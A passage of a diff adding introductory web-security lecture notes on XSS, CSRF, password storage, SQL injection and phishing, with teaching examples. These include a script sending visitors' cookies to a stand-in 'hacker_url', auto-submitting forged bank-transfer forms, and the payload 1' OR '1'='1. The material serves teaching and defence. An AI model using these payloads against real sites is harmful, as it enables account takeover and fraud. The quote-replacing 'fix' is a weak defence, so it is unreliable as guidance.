+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li data-marker="*">
+        <p>Let’s look at a more consequential example. Suppose Facebook does not defend against XSS (they do), we write this code in our Facebook profile, and we also own a site called <code class="language-plaintext highlighter-rouge">hacker_url</code>.</p>
+
+        <div class="language-python highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="o">/&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="p">.</span><span class="n">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span>
+    <span class="sh">'</span><span class="s">&lt;img src=</span><span class="sh">"</span><span class="s">hacker_url?cookie=</span><span class="sh">'</span><span class="o">&gt;</span> <span class="o">+</span> <span class="n">document</span><span class="p">.</span><span class="n">cookie</span> <span class="o">+</span> <span class="sh">'"</span><span class="s"> /&gt;</span><span class="sh">'</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+<span class="p">)</span>
+
+<span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">not_found</span><span class="p">(</span><span class="n">err</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">"</span><span class="s">Not Found: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span>
+</code></pre></div>        </div>
+
+        <ul>
+          <li data-marker="*">
+            <p>Anytime someone tries to visit our profile, their browser will have to read the script tag.</p>
+          </li>
+          <li data-marker="*">
+            <p><code class="language-plaintext highlighter-rouge">document.write</code> is JavaScript that adds what is inside to the HTML of the page.</p>
+          </li>
+          <li data-marker="*">
+            <p><code class="language-plaintext highlighter-rouge">document.cookie</code> in this case, since this exists on our Facebook profile, is an individual’s cookie for Facebook.</p>
+
+            <ul>
+              <li data-marker="*">A cookie is similar to a handstamp, where instead of logging in every time, we simply show Facebook our handstamp and we are let in.</li>
+            </ul>
+          </li>
+          <li data-marker="*">
+            <p>Each time someone visits our FaceBook page, they will also visit <code class="language-plaintext highlighter-rouge">hacker_url</code>. Then, via our <code class="language-plaintext highlighter-rouge">hacker_url</code> logs, we’ll be notified that someone has tried to visit <code class="language-plaintext highlighter-rouge">hacker_url?cookie=</code> + their cookie.</p>
+          </li>
+          <li data-marker="*">
+            <p>Now that we know know their cookie, we can attempt to change our Facebook cookie to theirs and log in as them instead.</p>
+          </li>
+          <li data-marker="*">
+            <p>We use the <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tags to trick users to forcibly visit our site, so we may obtain their cookie. Note that the site is forcibly visited because the browser will attempt to pull an image from our site.</p>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="protecting-against-xss">Protecting against XSS</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>We can sanitize the inputs to our site by using HTML entities, or other ways of representing certain characters in HTML.</p>
+
+    <ul>
+      <li data-marker="*">For example, instead of representing <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> as HTML, we can use <code class="language-plaintext highlighter-rouge">&amp;lt;</code> and <code class="language-plaintext highlighter-rouge">&amp;gt;</code>. When someone provides an input on our page, we can automatically change these, so our site no longer interprets these as HTML tags.</li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>We can also disable JavaScript, which has positive and negative consequences. This may be beneficial because XSS is usually introduced via JavaScript; however, JavaScript can also be very useful in creating a better user experience.</p>
+  </li>
+  <li data-marker="*">
+    <p>We can handle the JavaScript in a special way:</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>We can disable inline JavaScript, similar to the JavaScript provided earlier, but still allow JavaScript written in separate JavaScript files to be linked to our HTML pages.</p>
+      </li>
+      <li data-marker="*">
+        <p>We can sandbox the JavaScript, or run it separately somewhere else first. If there are not any unintended consequences, it will be displayed.</p>
+      </li>
+      <li data-marker="*">
+        <p>We can execute the Content Security Policy, which is a header that allows certain lines or types of JavaScript through but not others.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>CSRF attacks involve making outbound HTTP requests that were not intended. These attacks rely heavily on cookies since they allow shorthand verification of identities.</p>
+  </li>
+  <li data-marker="*">
+    <p>For example, suppose we send someone an email, asking them to click on a URL. At this URL, there’s a page with this code:</p>
+
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://hackbank.com/transfer?to=doug&amp;amt=500"</span><span class="nt">&gt;</span>
+        Click here!
+    <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li data-marker="*">
+        <p>In this case, we’ll assume that <code class="language-plaintext highlighter-rouge">hackbank.com</code> executes transactions after a user specifies a person and an amount. In the URL in this page, we see that we’re specifying the person as Doug and the amount as 500.</p>
+      </li>
+      <li data-marker="*">
+        <p>If the user is a customer of Hackbank and has Hackbank cookies in their browser, clicking on this link would result in 500 dollars being transferred to Doug.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>We can change the previous example so that a second link is not required.</p>
+
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://hackbank.com/transfer?to=doug&amp;amt=500"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+</code></pre></div>    </div>
+    <ul>
+      <li data-marker="*">Upon loading this page, the browser will go to the image link and attempt to load the image. This will complete the transaction.</li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>Similarly, we can create a form.</p>
+
+    <div class="language-html highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://hackbank.com/transfer"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"to"</span> <span class="na">value=</span><span class="s">"doug"</span><span class="nt">&gt;</span> /&gt;
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"amt"</span> <span class="na">value=</span><span class="s">"500"</span><span class="nt">&gt;</span> /&gt;
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Click here!"</span><span class="nt">&gt;</span> /&gt;
+    <span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+</code></pre></div>    </div>
+    <ul>
+      <li data-marker="*">
+        <p>Upon loading this page, a form will pop up with only a submit button since the other form fields have type “hidden.”</p>
+      </li>
+      <li data-marker="*">
+        <p>Once the user submits the form, the transaction will be completed.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>We can have this form instantly submitted as well, by adding <code class="language-plaintext highlighter-rouge">onload="document.forms[0].onsubmit()"</code> to the <code class="language-plaintext highlighter-rouge">&lt;body&gt;</code> tag. This will, upon loading, look for the first form on the page and immediately submit it.</p>
+  </li>
+</ul>
+
+<h2 id="databases">Databases</h2>
+
+<ul>
+  <li data-marker="*">
+    <p>Suppose we have a database of users that looks like this:</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th>id</th>
+          <th>username</th>
+          <th>password</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>1</td>
+          <td>alice</td>
+          <td>hello</td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td>bob</td>
+          <td>12345</td>
+        </tr>
+        <tr>
+          <td>3</td>
+          <td>charlie</td>
+          <td>password</td>
+        </tr>
+        <tr>
+          <td>4</td>
+          <td>donna</td>
+          <td>abcdef</td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td>eric</td>
+          <td>password</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li data-marker="*">
+    <p>First, we should not be storing their passwords, instead we should be storing hashes of their passwords. We might get this instead:</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th>id</th>
+          <th>username</th>
+          <th>hashed password</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>1</td>
+          <td>alice</td>
+          <td>5D41402ABC4B2A76B9719D911017C592</td>
+        </tr>
+        <tr>
+          <td>2</td>
+          <td>bob</td>
+          <td>827CCB0EEA8A706C4C34A16891F84E7B</td>
+        </tr>
+        <tr>
+          <td>3</td>
+          <td>charlie</td>
+          <td>5F4DCC3B5AA765D61D8327DEB882CF99</td>
+        </tr>
+        <tr>
+          <td>4</td>
+          <td>donna</td>
+          <td>E80B5017098950FC58AAD83C8C14978E</td>
+        </tr>
+        <tr>
+          <td>5</td>
+          <td>eric</td>
+          <td>5F4DCC3B5AA765D61D8327DEB882CF99</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li data-marker="*">
+    <p>If an adversary obtains our database of usernames and hashed passwords, they will know that charlie and eric have the same password. If they are able to guess charlie’s password (they might start by guessing common passwords since multiple people have the same password), then they will be able to log in as eric as well.</p>
+  </li>
+  <li data-marker="*">
+    <p>Another issue with the security of usernames and passwords comes with login screens. Generally, when a user clicks “Forgot Password,” a link will be sent to their email address to reset that password. The webpage may display either “Okay! We’ve emailed you a link to change your password” or “Sorry, there is no user with that email address.”</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>The webpage leaks information via these messages. Perhaps an adversary has hacked another database and has the credentials for a particular user. Since people generally tend to re-use the same credentials, the adversary can attempt to log in to other sites with that same credential.</p>
+      </li>
+      <li data-marker="*">
+        <p>By stating whether or not that user exists in the database, the adversary will know whether or not that user uses this particular service. By knowing which services this user uses, the adversary might be able to paint a picture of who the user may be.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>Instead, a forgot password message can say “Request received. If you are in our system, you’ll receive an email with instructions shortly.” This does not reveal whether or not the user actually has an account with the service.</p>
+  </li>
+</ul>
+
+<h3 id="sql-injection-attacks">SQL Injection Attacks</h3>
+
+<ul>
+  <li data-marker="*">
+    <p>Suppose when a user logs into our service, we check if they have the correct credentials via this SQL query. This queries a table called <code class="language-plaintext highlighter-rouge">users</code> that has a <code class="language-plaintext highlighter-rouge">username</code> field and a <code class="language-plaintext highlighter-rouge">password</code> field.</p>
+
+    <div class="language-sql highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="p">(</span><span class="n">username</span> <span class="o">=</span> <span class="n">uname</span><span class="p">)</span>
+<span class="k">AND</span> <span class="p">(</span><span class="n">password</span> <span class="o">=</span> <span class="n">pword</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li data-marker="*">
+    <p>If Alice logs in with username “alice” and password “12345” then our SQL query would look like this:</p>
+
+    <div class="language-sql highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="p">(</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'alice'</span><span class="p">)</span>
+<span class="k">AND</span> <span class="p">(</span><span class="n">password</span> <span class="o">=</span> <span class="s1">'12345'</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li data-marker="*">
+    <p>If someone logs in with username “hacker” and password “1’ OR ‘1’ = ‘1” then our SQL query would look like this:</p>
+
+    <div class="language-sql highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span>
+<span class="k">WHERE</span> <span class="p">(</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'hacker'</span><span class="p">)</span>
+<span class="k">AND</span> <span class="p">(</span><span class="n">password</span> <span class="o">=</span> <span class="s1">'1'</span> <span class="k">OR</span> <span class="s1">'1'</span> <span class="o">=</span> <span class="s1">'1'</span><span class="p">)</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li data-marker="*">
+        <p>Note that when this query is executed, there are two components that both must evaluate to true.</p>
+
+        <ol>
+          <li>username = ‘hacker’</li>
+          <li>password = ‘1’ or ‘1’ = ‘1’</li>
+        </ol>
+      </li>
+      <li data-marker="*">
+        <p>The first is true as long as the username exists in the database. The second will always evaluate to true because whether or not password = ‘1’, ‘1’ is always equal to ‘1’. Since they are joined by an “or,” only one has to be true for the entire statement to evaluate to true.</p>
+      </li>
+      <li data-marker="*">
+        <p>Thus, the hacker will be able to log in as the user “hacker,” even if they do not know the password. The hacker can also log in as an administrator and manipulate the data in the database.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>In this Python file called <code class="language-plaintext highlighter-rouge">login.py</code>, we’ll attempt to fix this problem.</p>
+
+    <div class="language-python highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="n">x</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Username: </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">y</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Password: </span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\'</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\"</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">y</span> <span class="o">=</span> <span class="n">y</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\'</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\"</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE username = </span><span class="sh">'</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="sh">'</span><span class="s"> AND password = </span><span class="sh">'</span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li data-marker="*">
+        <p>The replace function replaces each instance of a single quote with a double quote. Note that we use a backslash before the single quote and the double quote to identify the character. Without the backslash, it may be interpreted as the beginning or end of a string.</p>
+      </li>
+      <li data-marker="*">
+        <p>The <code class="language-plaintext highlighter-rouge">f</code> in the print statement denotes that this is a formatted string, where <code class="language-plaintext highlighter-rouge">{x}</code> is substituted with the value in the variable <code class="language-plaintext highlighter-rouge">x</code> and <code class="language-plaintext highlighter-rouge">{y}</code> is substituted with the value in the variable <code class="language-plaintext highlighter-rouge">y</code>.</p>
+      </li>
+      <li data-marker="*">
+        <p>Notice that we’re using single quotes to set off the variables in <code class="language-plaintext highlighter-rouge">username = '{x}'</code> and <code class="language-plaintext highlighter-rouge">password = '{y}'</code>. If there is a single quote in the value of <code class="language-plaintext highlighter-rouge">x</code> or <code class="language-plaintext highlighter-rouge">y</code>, then SQL will interpret that as the end of that string. By changing all the single quotes to double quotes in the values, this can no longer occur.</p>
+      </li>
+    </ul>
+  </li>
+  <li data-marker="*">
+    <p>Let’s run this code. Let our username be <code class="language-plaintext highlighter-rouge">Doug</code> and password be <code class="language-plaintext highlighter-rouge">1' or '1' = '1</code>.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>$ python login.py
+Username: Doug
+Password: 1' or '1' = '1
+SELECT * FROM USERS WHERE username = 'Doug' and password = '1" or "1" = "1'
+</code></pre></div>    </div>
+
+    <ul>
+      <li data-marker="*">In this example, SQL interprets the entire <code class="language-plaintext highlighter-rouge">1" or "1" = "1</code> as the password, and unless the password actually is <code class="language-plaintext highlighter-rouge">1" or "1" = "1</code>, the hacker will not be able to get in.</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="phishing">Phishing</h2>
+
+<ul>
+  <li data-marker="*">
+    <p>In phishing, an adversary attempts to socially engineer the target to give up secure information on their own. For example, they may pretend to be a business that the target regularly interacts with.</p>
+  </li>
+  <li data-marker="*">
+    <p>A simple way to phish is to use the anchor tags in HTML: <code class="language-plaintext highlighter-rouge">&lt;a href="url1"&gt;url2&lt;/a&gt;</code>. In this example, the user sees url2, but upon clicking url2, the user will be brought to url1.</p>
+  </li>
+  <li data-marker="*">
+    <p>Suppose an adversary wanted to obtain Facebook credentials, and they’ve acquired a domain name like “fscebook.com,” which is close enough for someone to mistype.</p>
+
+    <ul>
+      <li data-marker="*">
+        <p>They can create a webpage that looks just like Facebook’s by copying and pasting their HTML (we can find their HTML by right clicking on the Facebook page and clicking “Page Source”) into their webpage.</p>
+      </li>
+      <li data-marker="*">
+        <p>When someone clicks the “Log In” button, the adversary can store the information in the form, thereby saving the user’s credentials.</p>
+      </li>
+      <li data-marker="*">
+        <p>From there, the webpage can display a server error message and redirect the user to Facebook’s actual page. Upon logging in again, the user will be able to access Facebook, and most likely, the user will not know that they’ve just exposed their credentials.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+
+                </main>
+
+            </div>
+
+        </div>
+
+        
+ 
+        <script src="../../assets/page%EF%B9%961779994621.js"></script>
+
+    
+
+
+</body></html>
